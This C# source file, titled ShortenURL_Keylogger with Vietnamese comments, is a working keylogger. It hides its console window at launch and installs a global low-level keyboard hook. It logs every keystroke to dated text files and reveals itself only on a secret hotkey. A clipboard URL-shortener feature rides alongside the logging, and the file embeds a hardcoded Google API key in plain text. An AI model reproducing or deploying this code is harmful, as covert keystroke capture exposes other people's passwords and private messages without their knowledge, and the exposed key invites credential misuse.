using Google.Apis.Services;
using Google.Apis.Urlshortener.v1;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ShortenURL_Keylogger
{
    class Program
    {
        #region Hook key board

        // mã mặc định của window dùng để truyền vào trong hàm
        private const int WH_KEYBOARD_LL = 13; // mã để thể hiện hành động nhả phím
        private const int WM_KEYDOWN = 0x0100; // mã để thể hiện hành động nhấn phím xuống

        private static LowLevelKeyboardProc _proc = HookCallback; // khi lấy được dữ liệu thì sẽ gọi hàm HookCallback
        // kiểu dữ liệu Int Pointer
        private static IntPtr _hookID = IntPtr.Zero; // bất kì cái gì trong windows đều có 1 cái handle, là ID của các cái đang chạy trong HĐH

        private static string logExtendtion = ".txt";

        /*
         *những cái hàm mà windows cung cấp, mình cần dùng tới nó thì gọi ra
         */
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess()) // lấy tất cả các process đang chạy
            {
                using (ProcessModule curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                        GetModuleHandle(curModule.ModuleName), 0); // get info keyboard
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) // nếu có phím từ bàn phím được nhấn
            {
                int vkCode = Marshal.ReadInt32(lParam);
                CheckHotKey(vkCode);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>

        static string directoryLogFile = "Log File";
        static void WriteLog(int vkCode)
        {
            if (!Directory.Exists(directoryLogFile)) {
                Directory.CreateDirectory(directoryLogFile); // nếu chưa có (dùng lần đầu) thì tạo folder mới
            }
            // Console.WriteLine((Keys)vkCode); // ghi ra màn hình console
            string logNameToWrite = DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(directoryLogFile + "\\" + logNameToWrite, true); // nếu chưa tồn tại thì tạo file mới
            sw.Write((Keys)vkCode); // ghi vào file
            sw.Close(); // đóng file
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        #endregion

        #region HotKey

        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;
        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey) && (Keys)(vkCode) == Keys.Home)
                isHotKey = true;
            if ((previoursKey == Keys.LControlKey) && (Keys)(vkCode) == Keys.RControlKey) {
                if (Clipboard.ContainsText(TextDataFormat.Text)) {
                    string originalURL = Clipboard.GetText(TextDataFormat.Text);
                    string shortURL = shortenIt(originalURL);
                    Clipboard.SetText(shortURL, TextDataFormat.Text);
                }
            }

            if (isHotKey) {
                if (!isShowing) {
                    DisplayWindow();
                }
                else {
                    HideWindow();
                }
                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }

        #endregion

        #region Windows

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }

        #endregion

        #region Shorten URL
        public static string shortenIt(string url)
        {
            UrlshortenerService service = new UrlshortenerService(new BaseClientService.Initializer()
            {
                ApiKey = "AIzaSyBrqWxYLlP4Kx1x__ZngFoEyHC4m-vZg5c",
                ApplicationName = "Tung Xuan",
            });
            var m = new Google.Apis.Urlshortener.v1.Data.Url();
            m.LongUrl = url;
            return service.Url.Insert(m).Execute().Id;
        }

        #endregion
        [STAThread]
        static void Main(string[] args)
        {
            HideWindow();
            HookKeyboard();
        }
    }
}
